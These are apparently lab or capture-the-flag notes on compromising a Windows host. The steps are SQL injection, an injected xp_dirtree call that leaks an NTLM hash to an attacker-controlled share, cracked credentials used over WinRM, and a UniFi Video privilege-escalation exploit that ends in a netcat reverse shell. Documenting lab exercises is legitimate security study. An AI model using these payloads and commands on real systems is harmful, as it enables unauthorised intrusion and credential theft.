# Enumeration
---
## Port 80/ 443
- ![[Pasted image 20250814065309.png]]
- PowerShellWebAccessTestWebsite
- Opening this on browser gives nothing, so we need gobuster
	- `gobuster dir -u http://10.10.10.104/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -x txt,zip `
	- ![[Pasted image 20250814065417.png]]
	- Opening remote dir:
		![[Pasted image 20250814065352.png]]
- As HTTPS:
	- ![[Pasted image 20250814065459.png]]

## Enumerating mvc directory
---
- Clicking anything searches for a param in url:
	- ![[Pasted image 20250814070144.png]]
- ![[Pasted image 20250814070152.png]]
- Trying SQL Injection worked:
	- `http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=2%20OR%201=1`
	- ![[Pasted image 20250814070537.png]]

- Let's use SQLMap to dump database:
	- `sqlmap 'http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=2' --dump-all`
	- This reveals nothing good

## Getting NTLM hash with responder
---
- We can use MSSQL `dirtree` exec directly to obtain a NTLM hash:
- In burpsuite:
	- `GET /mvc/Product.aspx?ProductSubCategoryId=18%3bexec+master..xp_dirtree+'//10.10.16.2/share' HTTP/1.1`
	- ![[Pasted image 20250814212420.png]]
	- ![[Pasted image 20250814212516.png]]
- Cracking the hash:
	- ![[Pasted image 20250814212609.png]]
- `stacy` : `xNnWo6272k7x`

# Gaining Shell
---
- Testing these credentials using `netexec`:
	- `netexec winrm 10.10.10.104 -u stacy -p xNnWo6272k7x`
	- ![[Pasted image 20250814213636.png]]
- Evil-Winrm:
	- `evil-winrm -u stacy -p xNnWo6272k7x -i 10.10.10.104`
	- ![[Pasted image 20250814213658.png]]
Also on Windows Powershell on Browser:
---
- To login as user which is **NOT in domain**, append `.\`:
	- ![[Pasted image 20250815013652.png]]
	- 
# Enumeration
---
- Current directory has **unifivideo**:
	- ![[Pasted image 20250815013741.png]]
- Searching for exploits, reveal: https://www.exploit-db.com/exploits/43390
	- Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation
- ![[Pasted image 20250815013807.png]]

# Privilege Escalation
---
- Generate exe file using C language, because metasploit fails:
	- ![[Pasted image 20250815013901.png]]
- Upload `nc.exe` to `C:\Users\Stacy`
- Compile the exploit:
	- `x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe -mwindows`
- Upload to `C:\ProgramData\unifi-video\` directory
- Search for services related to Unifi:
	- Fails using `Get-Service` as we do not have permissions.
	- So, we need to search in Registry for installed applications:
		- `Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | Where-Object { $_.Name -match "unifi" }`
	- ![[Pasted image 20250815015940.png]]

- Start the listener and restart the service:
	- `nc -lnvp 9001` => On Attacker:
	- `Restart-Service -Name UniFiVideoService` => On Powershell
- ![[Pasted image 20250815020116.png]]
- ![[Pasted image 20250815020130.png]]